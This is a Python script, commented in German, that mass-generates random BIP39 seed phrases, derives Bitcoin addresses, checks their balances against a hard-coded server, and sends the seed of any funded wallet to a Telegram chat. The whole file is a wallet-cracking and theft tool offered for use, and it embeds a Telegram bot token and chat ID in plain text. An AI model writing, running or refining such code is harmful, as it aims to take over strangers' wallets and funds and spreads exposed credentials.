import os
import asyncio
import aiohttp
import logging
import multiprocessing
from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes, Bip39WordsNum
from aiogram import Bot
from aiohttp import ClientSession, TCPConnector

# Logger-Konfiguration
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Telegram-Token und Chat-ID direkt im Code definieren
TELEGRAM_TOKEN = "7706620947:AAGLGdTIKi4dB3irOtVmHD57f1Xxa8-ZIcs"
CHAT_ID = "1596333326"
ELECTRUMX_SERVER_URL = "http://85.215.178.149:50002"  # Beispiel-URL für ElectrumX-Server

bot = Bot(token=TELEGRAM_TOKEN)

async def notify_telegram(seed, btc_address, btc_balance):
    message = (
        f"⚠️ Wallet mit Balance gefunden!\n\n"
        f"Seed: {seed}\n"
        f"Adresse: {btc_address}\n"
        f"Balance: {btc_balance} BTC"
    )
    await bot.send_message(CHAT_ID, message)

def generate_bip39_seed():
    return Bip39MnemonicGenerator().FromWordsNumber(Bip39WordsNum.WORDS_NUM_12)

def bip44_btc_address_from_seed(seed_phrase):
    seed_bytes = Bip39SeedGenerator(seed_phrase).Generate()
    bip44_mst_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN)
    bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0)
    bip44_chg_ctx = bip44_acc_ctx.Change(Bip44Changes.CHAIN_EXT)
    bip44_addr_ctx = bip44_chg_ctx.AddressIndex(0)
    return bip44_addr_ctx.PublicKey().ToAddress()

async def check_btc_balance(address, retries=3, delay=2):
    connector = TCPConnector(limit=50)  # Erhöht die parallelen Verbindungen
    timeout = aiohttp.ClientTimeout(total=30)
    
    for attempt in range(retries):
        try:
            async with ClientSession(connector=connector, timeout=timeout) as session:
                async with session.get(f"{ELECTRUMX_SERVER_URL}/address/{address}") as response:
                    data = await response.json()
                    balance = data.get("confirmed", 0) / 100000000  # Satoshi zu BTC
                    return balance
        except aiohttp.ClientError as e:
            logging.warning(f"Attempt {attempt+1} failed for {address}: {e}")
            if attempt < retries - 1:
                await asyncio.sleep(delay)
                delay *= 2
            else:
                logging.error(f"Failed to retrieve balance for {address} after {retries} attempts")
                return 0  # Rückgabe von 0 bei wiederholten Fehlern

async def process_wallet_async(seed):
    btc_address = bip44_btc_address_from_seed(seed)
    btc_balance = await check_btc_balance(btc_address)
    if btc_balance > 0:
        logging.info(f"Wallet mit Balance gefunden: {btc_address} - Balance: {btc_balance} BTC")
        await notify_telegram(seed, btc_address, btc_balance)
    else:
        logging.info(f"Wallet ohne Balance überprüft: {btc_address}")

async def process_wallets_batch(seeds):
    tasks = [process_wallet_async(seed) for seed in seeds]
    await asyncio.gather(*tasks)

def process_wallets_multiprocessing(seeds):
    asyncio.run(process_wallets_batch(seeds))

async def main():
    while True:
        seeds = [generate_bip39_seed() for _ in range(500)]
        
        batch_size = 100  # Batch-Größe festlegen
        batches = [seeds[i:i + batch_size] for i in range(0, len(seeds), batch_size)]
        
        with multiprocessing.Pool() as pool:
            pool.map(process_wallets_multiprocessing, batches)

if __name__ == "__main__":
    asyncio.run(main())
